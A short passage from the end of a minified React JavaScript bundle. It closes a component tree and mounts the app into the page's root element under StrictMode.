						children: H(z),
					}),
				],
			}),
		],
	});
};
Yh.createRoot(document.getElementById("root")).render(
	f.jsx(mt.StrictMode, { children: f.jsx(kh, {}) })
);
